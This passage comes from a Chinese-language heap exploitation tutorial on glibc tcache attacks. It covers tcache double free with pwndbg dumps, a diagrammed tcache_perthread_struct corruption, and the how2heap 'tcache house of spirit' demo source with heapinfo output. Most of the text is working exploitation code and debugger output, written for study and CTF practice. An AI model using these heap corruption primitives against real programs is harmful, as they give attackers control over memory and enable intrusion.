   <span class="err">16</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">free</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span><span class="p">,</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c">;</span>
   <span class="err">17</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Next</span> <span class="no">allocated</span> <span class="no">buffers</span> <span class="no">will</span> <span class="no">be</span> <span class="no">same</span><span class="p">:</span> <span class="p">[</span> <span class="nv">%p</span><span class="p">,</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span><span class="c">;</span>
   <span class="err">18</span> 
   <span class="err">19</span>   <span class="nf">return</span> <span class="mi">0</span><span class="c">;</span>
<span class="err">────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
<span class="err">00:0000│</span> <span class="nf">rsp</span>  <span class="mi">0x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x555555554870</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">01:0008│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb8</span> <span class="err">—?</span> <span class="mi">0x555555756260</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">02:0010│</span>      <span class="err">0</span><span class="nf">x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0b0</span> <span class="err">?—</span> <span class="mi">0x1</span>
<span class="err">03:0018│</span>      <span class="err">0</span><span class="nf">x7fffffffdfc8</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">04:0020│</span> <span class="nf">rbp</span>  <span class="mi">0x7fffffffdfd0</span> <span class="err">—?</span> <span class="mi">0x555555554870</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">05:0028│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd8</span> <span class="err">—?</span> <span class="mi">0x7ffff7a3fa87</span> <span class="p">(</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">231</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
<span class="err">06:0030│</span>      <span class="err">0</span><span class="nf">x7fffffffdfe0</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">07:0038│</span>      <span class="err">0</span><span class="nf">x7fffffffdfe8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0b8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe3d8</span> <span class="err">?—</span> <span class="mi">0x346d2f656d6f682f</span> <span class="p">(</span><span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">m4</span><span class="err">&#39;</span><span class="p">)</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapinfo</span>
<span class="err">3886144</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x30</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x40</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x50</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x60</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x70</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x80</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xa0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xb0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="mi">0x0</span>
                  <span class="nl">top:</span> <span class="err">0</span><span class="nf">x555555756270</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d90</span><span class="p">)</span> 
       <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
            <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x555555756260</span>
</pre></div>
tcache 的第一条链放入了一个 chunk</p>
<p>第二次 free 时，虽然 free 的是同一个 chunk，但因为 <code>tcache_put()</code> 没有做任何检查，因此程序不会 crash
<div class="codehilite"><pre><span></span><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">n</span>
<span class="err">16</span>      <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">free</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span><span class="p">,</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c">;</span>
<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
<span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
 <span class="nf">RAX</span>  <span class="mi">0x0</span>
 <span class="nf">RBX</span>  <span class="mi">0x0</span>
 <span class="nf">RCX</span>  <span class="mi">0x0</span>
 <span class="nf">RDX</span>  <span class="mi">0x555555756260</span> <span class="err">?—</span> <span class="mi">0x555555756260</span> <span class="err">/</span><span class="p">*</span> <span class="err">&#39;`</span><span class="no">buUUU</span><span class="err">&#39;</span> <span class="p">*</span><span class="err">/</span>
 <span class="nf">RDI</span>  <span class="mi">0x2</span>
 <span class="nf">RSI</span>  <span class="mi">0x555555756010</span> <span class="err">?—</span> <span class="mi">0x2</span>
 <span class="nf">R8</span>   <span class="mi">0x1</span>
 <span class="nf">R9</span>   <span class="mi">0x7fffffffb79c</span> <span class="err">?—</span> <span class="mi">0x1a00000000</span>
 <span class="nf">R10</span>  <span class="mi">0x911</span>
 <span class="nf">R11</span>  <span class="mi">0x7ffff7aa0ba0</span> <span class="p">(</span><span class="no">free</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">rbx</span>
 <span class="nf">R12</span>  <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">R13</span>  <span class="mi">0x7fffffffe0b0</span> <span class="err">?—</span> <span class="mi">0x1</span>
 <span class="nf">R14</span>  <span class="mi">0x0</span>
 <span class="nf">R15</span>  <span class="mi">0x0</span>
 <span class="nf">RBP</span>  <span class="mi">0x7fffffffdfd0</span> <span class="err">—?</span> <span class="mi">0x555555554870</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RSP</span>  <span class="mi">0x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x555555554870</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RIP</span>  <span class="mi">0x555555554808</span> <span class="p">(</span><span class="no">main</span><span class="err">+</span><span class="mi">174</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x200851</span><span class="p">]</span>
<span class="err">───────────────────────────────────────[</span> <span class="nf">DISASM</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
   <span class="err">0</span><span class="nf">x5555555547f4</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">154</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x5555555547f7</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">157</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">free@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554600</span><span class="err">&gt;</span>

   <span class="err">0</span><span class="nf">x5555555547fc</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">162</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x555555554800</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">166</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x555555554803</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">169</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">free@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554600</span><span class="err">&gt;</span>

 <span class="err">?</span> <span class="err">0</span><span class="nf">x555555554808</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">174</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x200851</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x555555755060</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x55555555480f</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">181</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rcx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x555555554813</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">185</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x555555554817</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">189</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x152</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x55555555481e</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">196</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x555555554821</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">199</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">────────────────────────────────────[</span> <span class="nf">SOURCE</span> <span class="p">(</span><span class="no">CODE</span><span class="p">)</span> <span class="p">]</span><span class="err">────────────────────────────────────</span>
   <span class="err">11</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c">;</span>
   <span class="err">12</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Freeing</span> <span class="no">twice...</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">)</span><span class="c">;</span>
   <span class="err">13</span>   <span class="nf">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c">;</span>
   <span class="err">14</span>   <span class="nf">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c">;</span>
   <span class="err">15</span> 
 <span class="err">?</span> <span class="err">16</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">free</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span><span class="p">,</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c">;</span>
   <span class="err">17</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Next</span> <span class="no">allocated</span> <span class="no">buffers</span> <span class="no">will</span> <span class="no">be</span> <span class="no">same</span><span class="p">:</span> <span class="p">[</span> <span class="nv">%p</span><span class="p">,</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span><span class="c">;</span>
   <span class="err">18</span> 
   <span class="err">19</span>   <span class="nf">return</span> <span class="mi">0</span><span class="c">;</span>
   <span class="err">20</span> <span class="err">}</span>
<span class="err">────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
<span class="err">00:0000│</span> <span class="nf">rsp</span>  <span class="mi">0x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x555555554870</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">01:0008│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb8</span> <span class="err">—?</span> <span class="mi">0x555555756260</span> <span class="err">?—</span> <span class="mi">0x555555756260</span> <span class="err">/</span><span class="p">*</span> <span class="err">&#39;`</span><span class="no">buUUU</span><span class="err">&#39;</span> <span class="p">*</span><span class="err">/</span>
<span class="err">02:0010│</span>      <span class="err">0</span><span class="nf">x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0b0</span> <span class="err">?—</span> <span class="mi">0x1</span>
<span class="err">03:0018│</span>      <span class="err">0</span><span class="nf">x7fffffffdfc8</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">04:0020│</span> <span class="nf">rbp</span>  <span class="mi">0x7fffffffdfd0</span> <span class="err">—?</span> <span class="mi">0x555555554870</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">05:0028│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd8</span> <span class="err">—?</span> <span class="mi">0x7ffff7a3fa87</span> <span class="p">(</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">231</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
<span class="err">06:0030│</span>      <span class="err">0</span><span class="nf">x7fffffffdfe0</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">07:0038│</span>      <span class="err">0</span><span class="nf">x7fffffffdfe8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0b8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe3d8</span> <span class="err">?—</span> <span class="mi">0x346d2f656d6f682f</span> <span class="p">(</span><span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">m4</span><span class="err">&#39;</span><span class="p">)</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapinfo</span>
<span class="err">3886144</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x30</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x40</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x50</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x60</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x70</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x80</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xa0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xb0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="mi">0x0</span>
                  <span class="nl">top:</span> <span class="err">0</span><span class="nf">x555555756270</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d90</span><span class="p">)</span> 
       <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
            <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x555555756260</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x555555756260</span> <span class="p">(</span><span class="no">overlap</span> <span class="no">chunk</span> <span class="no">with</span> <span class="mi">0x555555756250</span><span class="p">(</span><span class="no">freed</span><span class="p">)</span> <span class="p">)</span>
</pre></div>
可以看出，这种方法与 <code>fastbin dup</code> 相比也简单了很多。</p>
<h4 id="tcache-perthread-corruption">tcache perthread corruption<a class="headerlink" href="#tcache-perthread-corruption" title="Permanent link">&para;</a></h4>
<p>我们已经知道 <code>tcache_perthread_struct</code> 是整个 tcache 的管理结构，如果能控制这个结构体，那么无论我们 malloc 的 size 是多少，地址都是可控的。</p>
<p>这里没找到太好的例子，自己想了一种情况</p>
<p>设想有如下的堆排布情况
<div class="codehilite"><pre><span></span>tcache_    +------------+
\perthread |......      |
\_struct   +------------+
           |counts[i]   |
           +------------+
           |......      |          +----------+
           +------------+          |header    |
           |entries[i]  |---------&gt;+----------+
           +------------+          |NULL      |
           |......      |          +----------+
           |            |          |          |
           +------------+          +----------+
</pre></div>
通过一些手段（如 <code>tcache posioning</code>），我们将其改为了
<div class="codehilite"><pre><span></span>tcache_    +------------+&lt;---------------------------+
\perthread |......      |                            |
\_struct   +------------+                            |
           |counts[i]   |                            |
           +------------+                            |
           |......      |          +----------+      |
           +------------+          |header    |      |
           |entries[i]  |---------&gt;+----------+      |
           +------------+          |target    |------+
           |......      |          +----------+
           |            |          |          |
           +------------+          +----------+
</pre></div>
这样，两次 malloc 后我们就返回了 <code>tcache_prethread_struct</code> 的地址，就可以控制整个 tcache 了。</p>
<p><strong>因为 tcache_prethread_struct 也在堆上，因此这种方法一般只需要 partial overwrite 就可以达到目的。</strong></p>
<h4 id="tcache-house-of-spirit">tcache house of spirit<a class="headerlink" href="#tcache-house-of-spirit" title="Permanent link">&para;</a></h4>
<p>拿 how2heap 的源码来讲：</p>
<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This file demonstrates the house of spirit attack on tcache.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;It works in a similar way to original house of spirit but you don&#39;t need to create fake chunk after the fake chunk that will be freed.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#39;s size and prev_inuse are sane.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;(Search for strings </span><span class="se">\&quot;</span><span class="s">invalid next size</span><span class="se">\&quot;</span><span class="s"> and </span><span class="se">\&quot;</span><span class="s">double free or corruption</span><span class="se">\&quot;</span><span class="s">)</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Ok. Let&#39;s start with the example!.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>


    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Calling malloc() once so that it sets up its memory.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Let&#39;s imagine we will overwrite 1 pointer to point to a fake chunk region.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span> <span class="c1">//pointer that will be overwritten</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span> <span class="c1">//fake chunk region</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This region contains one fake chunk. It&#39;s size field is placed at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x40</span><span class="p">;</span> <span class="c1">// this is the size</span>


    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">a</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Freeing the overwritten pointer.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;malloc(0x30): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">));</span>
<span class="p">}</span>
</pre></div>

<p>攻击之后的目的是，去控制栈上的内容，malloc 一块 chunk ，然后我们通过在栈上 fake 的chunk，然后去 free 掉他，我们会发现</p>
<div class="codehilite"><pre><span></span>gdb-peda$ heapinfo
<span class="o">(</span>0x20<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">0</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x30<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">1</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x40<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">2</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x50<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">3</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x60<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">4</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x70<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">5</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x80<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">6</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x90<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">7</span><span class="o">]</span>: 0x0
<span class="o">(</span>0xa0<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">8</span><span class="o">]</span>: 0x0
<span class="o">(</span>0xb0<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">9</span><span class="o">]</span>: 0x0
                  top: 0x4052e0 <span class="o">(</span>size : 0x20d20<span class="o">)</span>
       last_remainder: 0x0 <span class="o">(</span>size : 0x0<span class="o">)</span>
            unsortbin: 0x0
<span class="o">(</span>0x90<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">7</span><span class="o">]</span>: 0x7fffffffe510 --&gt; 0x401340
</pre></div>

<p>Tache 里就存放了一块 栈上的内容，我们之后只需 malloc，就可以控制这块内存。</p>
